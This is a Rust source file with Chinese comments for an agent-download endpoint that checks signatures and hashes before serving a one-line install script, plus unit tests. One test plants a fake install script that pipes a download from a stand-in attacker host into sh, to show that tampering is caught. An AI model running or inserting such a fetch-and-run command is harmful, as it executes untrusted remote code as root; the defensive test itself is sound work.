//! 8444 的下載端點 `GET /agent/<檔名>`（`crates/kairos-proto/ENROLL.md` 第 4 節、第 19.4 節第 3 項；
//! 設計包 `decisions/enroll-rate-limit.md` L11）：從 `enroll.download_dir` 提供 Pulse 的發佈檔案
//! （`pulse-install.sh`、deb／rpm／msi／zip／tar.gz、`SHA256SUMS`、`SHA256SUMS.sig`），供一行安裝指令
//! 與 `pulse-install.sh --base-url https://<註冊端點>/agent` 使用。
//!
//! - **套件的完整性不依賴這個端點**：`pulse-install.sh` 以另外取得的發佈公鑰驗證 `SHA256SUMS.sig`，再以
//!   `SHA256SUMS` 驗證套件（`pulse/packaging/INSTALL.md`）。Kairos 只是轉送，不簽章、不修改檔案。
//!   **腳本本身不在這個保證之內**——驗證的邏輯就在被下載的腳本裡。所以主控台的一行安裝指令帶著腳本的
//!   SHA-256（[`Status::install_script_sha256`]，經主控台的 HTTPS 取得），目標主機在執行之前先比對；
//!   這把對腳本的信任放在主控台與 `enroll.download_dir` 的內容上，後者只應由管理者可寫。
//! - **下載目錄的簽章（安全稽核 C3 加強）**：設定了 `[remote] allowed_signers` 時，Kairos 先以它驗證目錄的
//!   `SHA256SUMS.sig`（與匯入版本庫相同的 [`kairos_proto::release::verify_bundle`]），並要求**簽章涵蓋的**
//!   `SHA256SUMS` 列出 `pulse-install.sh` 且雜湊相符，通過才提供一行安裝指令（[`SignerTrust`]）。只能改寫下載
//!   目錄的人沒有發佈私鑰，換掉腳本並同步改掉 `SHA256SUMS` 也過不了。沒有設定 `allowed_signers` 時維持
//!   0.12.0 的行為（不驗證簽章），`downloads.signature` 為 `not_checked` 並附警語。
//! - **路徑**：檔名只能是 1～128 個英數字與 `. _ -`、不以 `.` 開頭（[`kairos_proto::enroll::parse_route`]，
//!   沒有 `/`、`..`、百分比編碼）；只提供目錄中**一般檔案**（不跟隨符號連結、不進入子目錄），大小上限 1 GiB。
//! - **內容類型**依副檔名（[`content_type`]），一律 `X-Content-Type-Options: nosniff` 與
//!   `Content-Disposition: attachment`。
//! - **快取**：`SHA256SUMS`、`SHA256SUMS.sig`、`pulse-install.sh` 每個版本都會改變，`Cache-Control: no-cache`
//!   （每次以 `ETag` 重新驗證）；其他檔名含版本，`public, max-age=3600`。支援 `If-None-Match`（304）。
//! - **L11**：每個來源同時 `enroll.max_downloads_per_ip`（批次部署來源乘以倍率）、全部
//!   `enroll.max_downloads` 個下載；超過時 429 `rate_limited`（`scope: download`，`Retry-After: 15`）。
//!   名額在本文送完（或連線中斷）時釋放。
//! - 註冊端點不受理新註冊時（僅續簽、自動暫停）回 403（[`super::handlers`]），與 ENROLL.md 第 6 節相同。

use hyper::body::Bytes;
use hyper::header::{self, HeaderValue};
use hyper::{Response, StatusCode};
use serde_json::{Value, json};
use std::collections::HashMap;
use std::net::IpAddr;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};
use std::time::{Duration, SystemTime, UNIX_EPOCH};
use tokio::io::AsyncReadExt;

use kairos_proto::mgmt::{MAX_SHA256SUMS_BYTES, MAX_SIGNATURE_BYTES};
use kairos_proto::release::{self, ReleaseBundle, ReleaseError, TrustPolicy};

use crate::api::http::ApiBody;
use crate::remote::releases::Trust;

/// 下載可用時必須存在的檔案（`pulse-install.sh --base-url` 先取這兩個驗證簽章）
pub const REQUIRED: [&str; 3] = [SCRIPT, "SHA256SUMS", "SHA256SUMS.sig"];
/// 一行安裝腳本的檔名
pub const SCRIPT: &str = "pulse-install.sh";
/// 安裝腳本的大小上限（計算雜湊時整個讀入）
pub const MAX_SCRIPT_BYTES: u64 = 4 << 20;
/// L11 被拒時的 `Retry-After`
pub const RETRY_AFTER: Duration = Duration::from_secs(15);
/// 單一檔案的大小上限
pub const MAX_FILE_BYTES: u64 = 1 << 30;
/// 讀檔的區塊大小
const CHUNK: usize = 64 * 1024;
/// 下載目錄不完整（無法讀取，或缺 `pulse-install.sh`、`SHA256SUMS`、`SHA256SUMS.sig`）的代碼
pub const CODE_INCOMPLETE: &str = "KRS-W2012";
/// 三個檔案都在，但安裝腳本沒有通過檢查（與同目錄 `SHA256SUMS` 記錄的雜湊不符、不是一般檔案、超過大小上限
/// 或讀不到）的代碼。**工程暫定號**（0.12.0 與缺檔共用 `KRS-W2012`；正式分配由設計包定案）
pub const CODE_SCRIPT_MISMATCH: &str = "KRS-W2013";
/// 設定了 `[remote] allowed_signers`，但下載目錄的 `SHA256SUMS.sig` 沒有通過驗證（簽章不符、簽署金鑰不被信任
/// 或已過期、簽章涵蓋的 `SHA256SUMS` 沒有列出安裝腳本或雜湊不符，或 `allowed_signers` 本身無法使用）的代碼。
/// **工程暫定號**（正式分配由設計包定案）
pub const CODE_SIGNATURE_UNVERIFIED: &str = "KRS-W2014";

/// 驗證下載目錄的簽章所用的信任設定（`[remote] allowed_signers`；安全稽核 C3 加強）
#[derive(Debug, Clone)]
pub enum SignerTrust {
    /// 沒有設定：不驗證簽章（0.12.0 的行為），狀態附警語
    NotConfigured,
    /// 設定了但無法使用（讀不到、沒有可用的金鑰）：無法驗證，不提供一行安裝指令
    Unavailable(String),
    /// 以這份信任設定驗證
    Configured(Trust),
}

/// 下載目錄簽章的檢查結果（API 的 `downloads.signature`）
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SignatureState {
    /// 沒有檢查：沒有設定 `allowed_signers`，或目錄在檢查簽章之前就不可用（`not_checked`）
    NotChecked,
    /// 通過（`verified`）：符合的 principal 與簽署金鑰的指紋
    Verified {
        principal: String,
        fingerprint: String,
    },
    /// 沒有通過（`failed`）
    Failed,
}

impl SignatureState {
    /// API 的值
    pub fn as_str(&self) -> &'static str {
        match self {
            SignatureState::NotChecked => "not_checked",
            SignatureState::Verified { .. } => "verified",
            SignatureState::Failed => "failed",
        }
    }
}

/// 沒有設定 `[remote] allowed_signers` 時的警語（啟動日誌與 API 的 `downloads.warning`）
pub const WARNING_SIGNATURE_NOT_CHECKED: &str = "沒有設定 [remote] allowed_signers：Kairos 沒有驗證下載目錄的 SHA256SUMS.sig，一行安裝指令只依賴下載目錄的內容；設定後 Kairos 會先以發佈公鑰驗證簽章，通過才提供指令";

/// 副檔名 → `Content-Type`
pub fn content_type(name: &str) -> &'static str {
    let lower = name.to_ascii_lowercase();
    let ext = |e: &str| lower.ends_with(e);
    if lower == "sha256sums" || ext(".txt") || ext(".sig") || ext(".asc") || ext(".pem") {
        "text/plain; charset=utf-8"
    } else if ext(".sh") {
        "text/x-shellscript; charset=utf-8"
    } else if ext(".ps1") {
        "text/plain; charset=utf-8"
    } else if ext(".deb") {
        "application/vnd.debian.binary-package"
    } else if ext(".rpm") {
        "application/x-rpm"
    } else if ext(".msi") {
        "application/x-msi"
    } else if ext(".zip") {
        "application/zip"
    } else if ext(".tar.gz") || ext(".tgz") || ext(".gz") {
        "application/gzip"
    } else if ext(".json") {
        "application/json"
    } else {
        "application/octet-stream"
    }
}

/// 每個版本都會改變的檔案（不長期快取）
fn changes_every_release(name: &str) -> bool {
    REQUIRED.contains(&name)
}

/// 下載的同時數（L11）
#[derive(Debug, Default)]
pub struct Slots {
    inner: Mutex<(usize, HashMap<IpAddr, usize>)>,
}

/// 一個下載的名額；釋放時（本文送完或中斷）歸還
#[derive(Debug)]
pub struct Slot {
    slots: Arc<Slots>,
    ip: IpAddr,
}

impl Drop for Slot {
    fn drop(&mut self) {
        let mut g = self.slots.inner.lock().unwrap_or_else(|e| e.into_inner());
        g.0 = g.0.saturating_sub(1);
        if let Some(n) = g.1.get_mut(&self.ip) {
            *n = n.saturating_sub(1);
            if *n == 0 {
                g.1.remove(&self.ip);
            }
        }
    }
}

impl Slots {
    /// 取得名額；同一來源或全部已滿時 `None`
    pub fn take(self: &Arc<Self>, ip: IpAddr, per_ip: usize, total: usize) -> Option<Slot> {
        let mut g = self.inner.lock().unwrap_or_else(|e| e.into_inner());
        let mine = g.1.get(&ip).copied().unwrap_or(0);
        if g.0 >= total || mine >= per_ip {
            return None;
        }
        g.0 += 1;
        *g.1.entry(ip).or_insert(0) += 1;
        Some(Slot {
            slots: self.clone(),
            ip,
        })
    }

    /// 目前的同時數
    pub fn in_use(&self) -> usize {
        self.inner.lock().unwrap_or_else(|e| e.into_inner()).0
    }
}

/// 下載目錄的狀態
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Status {
    pub available: bool,
    /// 不可用的原因（給管理者）
    pub reason: Option<String>,
    /// 設定了目錄卻不可用時的產品代碼（[`CODE_INCOMPLETE`]、[`CODE_SCRIPT_MISMATCH`]、
    /// [`CODE_SIGNATURE_UNVERIFIED`]）；沒有設定目錄或可用時 `None`
    pub code: Option<&'static str>,
    /// 目錄中可下載的檔案（依名稱排序）
    pub files: Vec<String>,
    /// `pulse-install.sh` 的 SHA-256（可用時才有）
    pub install_script_sha256: Option<String>,
    /// 下載目錄簽章的檢查結果
    pub signature: SignatureState,
    /// 可用但需要提醒管理者的事（沒有設定 `allowed_signers`）
    pub warning: Option<String>,
}

impl Status {
    /// 不可用的狀態
    fn unavailable(reason: String, code: Option<&'static str>, files: Vec<String>) -> Self {
        Status {
            available: false,
            reason: Some(reason),
            code,
            files,
            install_script_sha256: None,
            signature: SignatureState::NotChecked,
            warning: None,
        }
    }
}

/// 檢查下載目錄（`dir` 為空：未設定）。`trust` 為 `[remote] allowed_signers`，`now_unix` 用於判斷簽署金鑰的
/// `valid-after`／`valid-before`
pub fn status(dir: Option<&Path>, trust: &SignerTrust, now_unix: i64) -> Status {
    let Some(dir) = dir else {
        return Status::unavailable(
            "沒有設定 enroll.download_dir（下載端點未啟用，/agent/ 回 404）".to_string(),
            None,
            Vec::new(),
        );
    };
    let mut files: Vec<String> = match std::fs::read_dir(dir) {
        Ok(rd) => rd
            .filter_map(Result::ok)
            .filter(|e| e.file_type().is_ok_and(|t| t.is_file()))
            .filter_map(|e| e.file_name().into_string().ok())
            .filter(|n| kairos_proto::enroll::parse_route("GET", &format!("/agent/{n}")).is_ok())
            .collect(),
        Err(e) => {
            return Status::unavailable(
                format!("無法讀取 enroll.download_dir（{}）：{e}", dir.display()),
                Some(CODE_INCOMPLETE),
                Vec::new(),
            );
        }
    };
    files.sort();
    let missing: Vec<&str> = REQUIRED
        .iter()
        .copied()
        .filter(|r| !files.iter().any(|f| f == r))
        .collect();
    if !missing.is_empty() {
        return Status::unavailable(
            format!(
                "enroll.download_dir（{}）缺少 {}：請放入同一個發佈版本的 pulse-install.sh、SHA256SUMS、SHA256SUMS.sig 與套件",
                dir.display(),
                missing.join("、")
            ),
            Some(CODE_INCOMPLETE),
            files,
        );
    }
    let hash = match install_script_sha256(dir) {
        Ok(hash) => hash,
        Err(why) => {
            return Status::unavailable(
                format!("enroll.download_dir（{}）：{why}", dir.display()),
                Some(CODE_SCRIPT_MISMATCH),
                files,
            );
        }
    };
    // 安全稽核 C3 加強：設定了 allowed_signers 時，簽章通過才提供一行安裝指令
    let unverified = |why: String| Status {
        signature: SignatureState::Failed,
        ..Status::unavailable(
            format!(
                "enroll.download_dir（{}）：{why}；沒有通過驗證之前不提供一行安裝指令",
                dir.display()
            ),
            Some(CODE_SIGNATURE_UNVERIFIED),
            files.clone(),
        )
    };
    let (signature, warning) = match trust {
        SignerTrust::NotConfigured => (
            SignatureState::NotChecked,
            Some(WARNING_SIGNATURE_NOT_CHECKED.to_string()),
        ),
        SignerTrust::Unavailable(e) => {
            return unverified(format!(
                "[remote] allowed_signers 無法使用（{e}），無法驗證 SHA256SUMS.sig"
            ));
        }
        SignerTrust::Configured(t) => match verify_signature(dir, &hash, t, now_unix) {
            Ok(state) => (state, None),
            Err(why) => return unverified(why),
        },
    };
    Status {
        available: true,
        reason: None,
        code: None,
        files,
        install_script_sha256: Some(hash),
        signature,
        warning,
    }
}

/// 讀取下載目錄中的一個文字檔（一般檔案、不超過 `max` bytes、UTF-8）
fn read_small_text(dir: &Path, name: &str, max: usize) -> Result<String, String> {
    let path = dir.join(name);
    let meta = std::fs::symlink_metadata(&path).map_err(|e| format!("無法讀取 {name}：{e}"))?;
    if !meta.file_type().is_file() {
        return Err(format!("{name} 不是一般檔案"));
    }
    if meta.len() > max as u64 {
        return Err(format!("{name} 超過 {max} bytes"));
    }
    std::fs::read_to_string(&path).map_err(|e| format!("無法讀取 {name}：{e}"))
}

/// 以 `[remote] allowed_signers` 驗證下載目錄的 `SHA256SUMS.sig`（與匯入版本庫相同的驗證），再以**簽章涵蓋的**
/// `SHA256SUMS` 確認安裝腳本（`script_sha256` 是剛才算出、之後放進指令的雜湊）：必須列在其中而且相符——沒有
/// 列出時簽章對腳本沒有任何保證，一樣不通過
fn verify_signature(
    dir: &Path,
    script_sha256: &str,
    trust: &Trust,
    now_unix: i64,
) -> Result<SignatureState, String> {
    let sums = read_small_text(dir, "SHA256SUMS", MAX_SHA256SUMS_BYTES)?;
    let sig = read_small_text(dir, "SHA256SUMS.sig", MAX_SIGNATURE_BYTES)?;
    let verified = release::verify_bundle(
        &ReleaseBundle {
            sha256sums: &sums,
            signature: &sig,
            manifest: None,
        },
        &TrustPolicy {
            signers: &trust.signers,
            extra_principals: &trust.extra_principals,
            now_unix,
        },
    )
    .map_err(|e| match e {
        ReleaseError::Signature(s) => format!(
            "SHA256SUMS.sig 沒有通過 [remote] allowed_signers 的驗證（{s}）：請放入官方發佈包原本的 SHA256SUMS 與 SHA256SUMS.sig，或確認 allowed_signers 列出了簽署這次發佈的公鑰"
        ),
        ReleaseError::Integrity(s) => format!("SHA256SUMS 的格式不正確（{s}）"),
    })?;
    verified.sums.check(SCRIPT, script_sha256).map_err(|e| {
        format!("簽章涵蓋的 SHA256SUMS 無法確認 {SCRIPT}（{e}）：請放入同一個發佈版本的 {SCRIPT}")
    })?;
    Ok(SignatureState::Verified {
        principal: verified.signer.principal,
        fingerprint: verified.signer.fingerprint,
    })
}

/// `pulse-install.sh` 的 SHA-256（小寫十六進位）。主控台把它放進一行安裝指令，目標主機在執行腳本之前先比對
/// ——腳本是以 root 執行的，而驗證套件簽章的邏輯就在腳本裡，所以腳本本身要有一個不經過這個端點的憑據。
/// 同一個目錄的 `SHA256SUMS` 有列出 `pulse-install.sh` 時兩者必須相符（放錯版本或檔案被改過時不提供指令）
fn install_script_sha256(dir: &Path) -> Result<String, String> {
    let path = dir.join(SCRIPT);
    let meta = std::fs::symlink_metadata(&path).map_err(|e| format!("無法讀取 {SCRIPT}：{e}"))?;
    if !meta.file_type().is_file() || meta.len() > MAX_SCRIPT_BYTES {
        return Err(format!(
            "{SCRIPT} 不是一般檔案或超過 {} MiB",
            MAX_SCRIPT_BYTES >> 20
        ));
    }
    let bytes = std::fs::read(&path).map_err(|e| format!("無法讀取 {SCRIPT}：{e}"))?;
    let hash = kairos_proto::enroll::sha256_hex(&bytes);
    let listed = std::fs::read_to_string(dir.join("SHA256SUMS"))
        .ok()
        .and_then(|text| {
            text.lines().find_map(|line| {
                let (h, name) = line.split_once(char::is_whitespace)?;
                (name.trim().trim_start_matches('*') == SCRIPT).then(|| h.to_ascii_lowercase())
            })
        });
    match listed {
        Some(l) if l != hash => Err(format!(
            "{SCRIPT} 的內容與 SHA256SUMS 記錄的雜湊不符：請重新放入同一個發佈版本的檔案"
        )),
        _ => Ok(hash),
    }
}

/// 主控台 API 的 `downloads`（`GET /api/v1/enroll/mode` 等；設計包 INTEGRATION §27.4 #3）
pub fn status_json(
    dir: Option<&Path>,
    trust: &SignerTrust,
    now_unix: i64,
    base_url: &str,
) -> Value {
    let s = status(dir, trust, now_unix);
    let signer = match &s.signature {
        SignatureState::Verified {
            principal,
            fingerprint,
        } => json!({"principal": principal, "fingerprint": fingerprint}),
        _ => Value::Null,
    };
    json!({
        "available": s.available,
        "reason": s.reason,
        "product_code": s.code,
        "signature": s.signature.as_str(),
        "signer": signer,
        "warning": s.warning,
        "base_url": s.available.then(|| base_url.to_string()),
        "install_script": s.available.then(|| format!("{base_url}/{SCRIPT}")),
        "install_script_sha256": s.install_script_sha256,
        "files": s.files,
        "alternative": "以安裝套件（MSI、deb、rpm）安裝 Pulse 後執行 pulse enroll --install-string <安裝字串>",
    })
}

/// IMF-fixdate（`Last-Modified`）
fn http_date(t: SystemTime) -> String {
    let secs = t
        .duration_since(UNIX_EPOCH)
        .map_or(0, |d| d.as_secs() as i64);
    chrono::DateTime::from_timestamp(secs, 0)
        .unwrap_or_default()
        .format("%a, %d %b %Y %H:%M:%S GMT")
        .to_string()
}

fn etag(name: &str, len: u64, modified: SystemTime) -> String {
    let nanos = modified
        .duration_since(UNIX_EPOCH)
        .map_or(0, |d| d.as_nanos());
    let h = kairos_proto::enroll::sha256_hex(format!("{name}|{len}|{nanos}").as_bytes());
    format!("\"{}\"", &h[..20])
}

/// 準備下載回應；檔案不存在（或不是一般檔案、超過上限）時 `None`（呼叫端回 404）。
/// `head`：只回標頭。`if_none_match` 相符時 304。`slot` 在本文送完時釋放
pub async fn respond(
    dir: &Path,
    name: &str,
    head: bool,
    if_none_match: Option<&str>,
    slot: Slot,
) -> Option<Response<ApiBody>> {
    let path: PathBuf = dir.join(name);
    let meta = tokio::fs::symlink_metadata(&path).await.ok()?;
    if !meta.file_type().is_file() || meta.len() > MAX_FILE_BYTES {
        return None;
    }
    let len = meta.len();
    let modified = meta.modified().unwrap_or(UNIX_EPOCH);
    let tag = etag(name, len, modified);
    let cache = if changes_every_release(name) {
        "no-cache"
    } else {
        "public, max-age=3600"
    };
    let headers = |resp: &mut Response<ApiBody>| {
        let h = resp.headers_mut();
        h.insert(header::CACHE_CONTROL, HeaderValue::from_static(cache));
        h.insert(
            header::X_CONTENT_TYPE_OPTIONS,
            HeaderValue::from_static("nosniff"),
        );
        if let Ok(v) = HeaderValue::from_str(&tag) {
            h.insert(header::ETAG, v);
        }
        if let Ok(v) = HeaderValue::from_str(&http_date(modified)) {
            h.insert(header::LAST_MODIFIED, v);
        }
    };
    if if_none_match.is_some_and(|v| v.split(',').any(|t| t.trim() == tag || t.trim() == "*")) {
        let mut resp = Response::new(ApiBody::Full(None));
        *resp.status_mut() = StatusCode::NOT_MODIFIED;
        headers(&mut resp);
        return Some(resp);
    }
    let body = if head {
        drop(slot);
        ApiBody::Full(None)
    } else {
        let mut file = tokio::fs::File::open(&path).await.ok()?;
        let (tx, rx) = tokio::sync::mpsc::channel::<Bytes>(4);
        tokio::spawn(async move {
            // 名額在送完或用戶端中斷（接收端被釋放，send 失敗）時歸還
            let _slot = slot;
            let mut left = len;
            let mut buf = vec![0u8; CHUNK];
            while left > 0 {
                let want = buf.len().min(usize::try_from(left).unwrap_or(CHUNK));
                match file.read(&mut buf[..want]).await {
                    Ok(0) | Err(_) => break,
                    Ok(n) => {
                        left -= n as u64;
                        if tx.send(Bytes::copy_from_slice(&buf[..n])).await.is_err() {
                            break;
                        }
                    }
                }
            }
        });
        ApiBody::Stream { rx, _permit: None }
    };
    let mut resp = Response::new(body);
    headers(&mut resp);
    let h = resp.headers_mut();
    h.insert(
        header::CONTENT_TYPE,
        HeaderValue::from_static(content_type(name)),
    );
    h.insert(header::CONTENT_LENGTH, HeaderValue::from(len));
    if let Ok(v) = HeaderValue::from_str(&format!("attachment; filename=\"{name}\"")) {
        h.insert(header::CONTENT_DISPOSITION, v);
    }
    Some(resp)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::remote::test_sign::TestSigner;
    use kairos_proto::release::AllowedSigners;

    /// 沒有設定 `[remote] allowed_signers`（0.12.0 的行為）
    const NO_TRUST: SignerTrust = SignerTrust::NotConfigured;
    /// 測試用的現在時間（2026-11-16）
    const NOW: i64 = 1_794_787_200;
    const URL: &str = "https://k:8444/agent";

    fn trust_of(allowed_signers: &str) -> SignerTrust {
        SignerTrust::Configured(Trust {
            signers: AllowedSigners::parse(allowed_signers),
            extra_principals: Vec::new(),
        })
    }

    /// 一個完整的下載目錄：安裝腳本、列出它的 `SHA256SUMS`、`signer` 的簽章。回傳（目錄、腳本的雜湊）
    fn signed_dir(tag: &str, signer: &TestSigner) -> (PathBuf, String) {
        let d = dir(tag);
        let script = "#!/bin/sh\necho official\n";
        let hash = kairos_proto::enroll::sha256_hex(script.as_bytes());
        let sums = format!(
            "{}  pulse_0.12.0_amd64.deb\n{hash}  pulse-install.sh\n",
            "1".repeat(64)
        );
        std::fs::write(d.join("pulse-install.sh"), script).unwrap();
        std::fs::write(d.join("SHA256SUMS"), &sums).unwrap();
        std::fs::write(d.join("SHA256SUMS.sig"), signer.sign(sums.as_bytes())).unwrap();
        (d, hash)
    }

    /// 不提供一行安裝指令：API 沒有 `base_url`、`install_script`、`install_script_sha256`（主控台靠這三個欄位組出指令）
    fn assert_no_one_liner(v: &Value) {
        assert_eq!(v["available"], false, "{v}");
        assert!(v["base_url"].is_null(), "{v}");
        assert!(v["install_script"].is_null(), "{v}");
        assert!(v["install_script_sha256"].is_null(), "{v}");
        assert!(v["reason"].as_str().is_some_and(|r| !r.is_empty()), "{v}");
    }

    // 安全稽核 C3 加強：設定了 allowed_signers，簽章通過才提供一行安裝指令
    #[test]
    fn with_allowed_signers_a_verified_signature_enables_the_one_liner() {
        let signer = TestSigner::new(7);
        let (d, hash) = signed_dir("sig-ok", &signer);
        let trust = trust_of(&signer.allowed_signers());
        let s = status(Some(&d), &trust, NOW);
        assert!(s.available, "{s:?}");
        assert_eq!(s.code, None);
        assert_eq!(s.warning, None, "已驗證時沒有警語");
        let SignatureState::Verified {
            principal,
            fingerprint,
        } = &s.signature
        else {
            panic!("{s:?}");
        };
        assert_eq!(principal, "release@kairos-pulse");
        assert!(fingerprint.starts_with("SHA256:"), "{fingerprint}");
        let v = status_json(Some(&d), &trust, NOW, URL);
        assert_eq!(v["available"], true);
        assert_eq!(v["signature"], "verified");
        assert_eq!(v["signer"]["fingerprint"], fingerprint.as_str());
        assert_eq!(v["install_script_sha256"], hash.as_str());
        assert_eq!(v["base_url"], URL);
        assert!(v["product_code"].is_null() && v["warning"].is_null());
        let _ = std::fs::remove_dir_all(&d);
    }

    // 稽核 C3 的情境：只能改寫下載目錄的人換掉安裝腳本，並把 SHA256SUMS 改成一致。0.12.0 的檢查（腳本與同目錄
    // SHA256SUMS 相符）擋不住；設定了 allowed_signers 之後簽章不符，不提供指令
    #[test]
    fn a_replaced_script_with_a_rewritten_sha256sums_fails_the_signature_check() {
        let signer = TestSigner::new(7);
        let (d, _) = signed_dir("sig-rewritten", &signer);
        let evil = "#!/bin/sh\ncurl https://evil.example/x | sh\n";
        let evil_hash = kairos_proto::enroll::sha256_hex(evil.as_bytes());
        std::fs::write(d.join("pulse-install.sh"), evil).unwrap();
        std::fs::write(
            d.join("SHA256SUMS"),
            format!(
                "{}  pulse_0.12.0_amd64.deb\n{evil_hash}  pulse-install.sh\n",
                "1".repeat(64)
            ),
        )
        .unwrap();
        // 沒有設定 allowed_signers：與 0.12.0 相同，這個目錄看起來是一致的（所以才需要簽章）
        let legacy = status(Some(&d), &NO_TRUST, NOW);
        assert!(legacy.available, "{legacy:?}");
        assert_eq!(legacy.signature, SignatureState::NotChecked);
        // 設定了：不提供
        let trust = trust_of(&signer.allowed_signers());
        let s = status(Some(&d), &trust, NOW);
        assert!(!s.available, "{s:?}");
        assert_eq!(s.code, Some(CODE_SIGNATURE_UNVERIFIED));
        assert_eq!(s.signature, SignatureState::Failed);
        assert_eq!(s.install_script_sha256, None);
        let v = status_json(Some(&d), &trust, NOW, URL);
        assert_no_one_liner(&v);
        assert_eq!(v["product_code"], "KRS-W2014");
        assert_eq!(v["signature"], "failed");
        assert!(v["signer"].is_null());
        assert!(
            v["reason"]
                .as_str()
                .unwrap()
                .contains("SHA256SUMS.sig 沒有通過"),
            "{v}"
        );
        // 攻擊者連簽章一起換成自己的金鑰簽的：金鑰不在 allowed_signers
        let attacker = TestSigner::new(9);
        let sums = std::fs::read(d.join("SHA256SUMS")).unwrap();
        std::fs::write(d.join("SHA256SUMS.sig"), attacker.sign(&sums)).unwrap();
        let v = status_json(Some(&d), &trust, NOW, URL);
        assert_no_one_liner(&v);
        assert_eq!(v["product_code"], "KRS-W2014");
        // 簽章不是 SSHSIG
        std::fs::write(d.join("SHA256SUMS.sig"), "sig").unwrap();
        let v = status_json(Some(&d), &trust, NOW, URL);
        assert_no_one_liner(&v);
        assert_eq!(v["product_code"], "KRS-W2014");
        let _ = std::fs::remove_dir_all(&d);
    }

    // 簽章只保護 SHA256SUMS 列出的檔案：沒有列出安裝腳本時，簽章對腳本沒有任何保證
    #[test]
    fn a_verified_signature_must_cover_the_install_script() {
        let signer = TestSigner::new(7);
        let d = dir("sig-unlisted");
        let sums = format!("{}  pulse_0.12.0_amd64.deb\n", "1".repeat(64));
        std::fs::write(d.join("pulse-install.sh"), "#!/bin/sh\necho anything\n").unwrap();
        std::fs::write(d.join("SHA256SUMS"), &sums).unwrap();
        std::fs::write(d.join("SHA256SUMS.sig"), signer.sign(sums.as_bytes())).unwrap();
        // 沒有設定 allowed_signers：維持 0.12.0（沒有列出時不比對）
        assert!(status(Some(&d), &NO_TRUST, NOW).available);
        let trust = trust_of(&signer.allowed_signers());
        let s = status(Some(&d), &trust, NOW);
        assert!(!s.available, "{s:?}");
        assert_eq!(s.code, Some(CODE_SIGNATURE_UNVERIFIED));
        assert!(
            s.reason
                .as_ref()
                .unwrap()
                .contains("無法確認 pulse-install.sh"),
            "{s:?}"
        );
        assert_no_one_liner(&status_json(Some(&d), &trust, NOW, URL));
        let _ = std::fs::remove_dir_all(&d);
    }

    // 簽署金鑰過期（valid-before 已過）、allowed_signers 無法使用：都不提供，原因各自說明
    #[test]
    fn an_expired_signer_or_an_unusable_trust_anchor_disables_the_one_liner() {
        let signer = TestSigner::new(7);
        let (d, _) = signed_dir("sig-expired", &signer);
        let line = signer.allowed_signers();
        let expired = line.replacen(
            "namespaces=\"kairos-pulse-release\"",
            "namespaces=\"kairos-pulse-release\",valid-before=\"20200101\"",
            1,
        );
        assert_ne!(expired, line);
        let s = status(Some(&d), &trust_of(&expired), NOW);
        assert!(!s.available, "{s:?}");
        assert_eq!(s.code, Some(CODE_SIGNATURE_UNVERIFIED));
        assert!(s.reason.as_ref().unwrap().contains("expired"), "{s:?}");
        // 同一行沒有期限時通過（確認上面失敗的原因是期限）
        assert!(status(Some(&d), &trust_of(&line), NOW).available);
        // allowed_signers 設定了但讀不到：無法驗證，不能當成沒有設定
        let broken = SignerTrust::Unavailable("/etc/kairos/allowed_signers：No such file".into());
        let s = status(Some(&d), &broken, NOW);
        assert!(!s.available, "{s:?}");
        assert_eq!(s.code, Some(CODE_SIGNATURE_UNVERIFIED));
        assert_eq!(s.signature, SignatureState::Failed);
        assert!(
            s.reason
                .as_ref()
                .unwrap()
                .contains("allowed_signers 無法使用"),
            "{s:?}"
        );
        assert_no_one_liner(&status_json(Some(&d), &broken, NOW, URL));
        let _ = std::fs::remove_dir_all(&d);
    }

    // 預設行為不變：沒有設定 allowed_signers 的既有部署照常提供一行安裝指令（簽章檔的內容不檢查），只多警語
    #[test]
    fn without_allowed_signers_the_existing_behaviour_is_kept_with_a_warning() {
        let d = dir("sig-legacy");
        let script = "#!/bin/sh\n";
        let hash = kairos_proto::enroll::sha256_hex(script.as_bytes());
        std::fs::write(d.join("pulse-install.sh"), script).unwrap();
        std::fs::write(d.join("SHA256SUMS"), format!("{hash}  pulse-install.sh\n")).unwrap();
        std::fs::write(d.join("SHA256SUMS.sig"), "not a signature").unwrap();
        let v = status_json(Some(&d), &NO_TRUST, NOW, URL);
        assert_eq!(v["available"], true, "{v}");
        assert_eq!(v["install_script_sha256"], hash.as_str());
        assert_eq!(v["base_url"], URL);
        assert_eq!(v["signature"], "not_checked");
        assert!(v["signer"].is_null() && v["product_code"].is_null());
        assert!(
            v["warning"].as_str().unwrap().contains("allowed_signers"),
            "{v}"
        );
        // 簽章以前的檢查先做：缺檔、腳本不符時代碼不變，也不附「沒有驗證簽章」的警語
        std::fs::write(d.join("pulse-install.sh"), "#!/bin/sh\necho changed\n").unwrap();
        let signer = TestSigner::new(7);
        for trust in [NO_TRUST, trust_of(&signer.allowed_signers())] {
            let v = status_json(Some(&d), &trust, NOW, URL);
            assert_eq!(v["product_code"], "KRS-W2013", "{v}");
            assert_eq!(v["signature"], "not_checked");
            assert!(v["warning"].is_null());
        }
        let _ = std::fs::remove_dir_all(&d);
    }

    fn dir(tag: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!(
            "kairos-downloads-{tag}-{}-{}",
            std::process::id(),
            crate::registry::next_conn_id()
        ));
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    #[test]
    fn content_types_and_cache_classes() {
        assert_eq!(
            content_type("pulse-install.sh"),
            "text/x-shellscript; charset=utf-8"
        );
        assert_eq!(content_type("SHA256SUMS"), "text/plain; charset=utf-8");
        assert_eq!(content_type("SHA256SUMS.sig"), "text/plain; charset=utf-8");
        assert_eq!(
            content_type("pulse_0.9.0_amd64.deb"),
            "application/vnd.debian.binary-package"
        );
        assert_eq!(
            content_type("pulse-0.9.0-1.x86_64.rpm"),
            "application/x-rpm"
        );
        assert_eq!(content_type("Pulse-0.9.0.msi"), "application/x-msi");
        assert_eq!(
            content_type("pulse-0.9.0-linux-x86_64.tar.gz"),
            "application/gzip"
        );
        assert_eq!(content_type("x.bin"), "application/octet-stream");
        assert!(changes_every_release("SHA256SUMS"));
        assert!(!changes_every_release("pulse_0.9.0_amd64.deb"));
    }

    #[test]
    fn status_requires_the_signed_checksums_and_the_script() {
        let s = status(None, &NO_TRUST, NOW);
        assert_eq!(s.code, None, "沒有設定下載目錄不是警告");
        assert!(!s.available && s.reason.unwrap().contains("enroll.download_dir"));
        assert!(
            status_json(None, &NO_TRUST, NOW, "https://k:8444/agent")["product_code"].is_null()
        );
        let d = dir("status");
